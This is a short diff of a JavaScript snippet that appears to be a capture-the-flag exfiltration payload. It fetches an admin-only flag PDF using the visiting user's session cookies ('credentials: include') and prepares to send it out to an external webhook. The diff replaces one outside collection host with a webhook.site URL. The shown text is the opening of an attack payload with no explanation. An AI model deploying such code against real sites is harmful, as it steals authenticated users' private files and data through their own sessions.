@@ -2,7 +2,7 @@
     // URL for the admin-only flag PDF
     const flagUrl = '/app/admin/flag.pdf';
     // Replace with your actual webhook URL
-    const webhookUrl = 'https://wechatapp.xsm756.xyz/';
+    const webhookUrl = 'https://webhook.site/983efb78-1907-457e-8de5-e71d11d21017';
 
     // Fetch the PDF with admin credentials
     fetch(flagUrl, { credentials: 'include' })
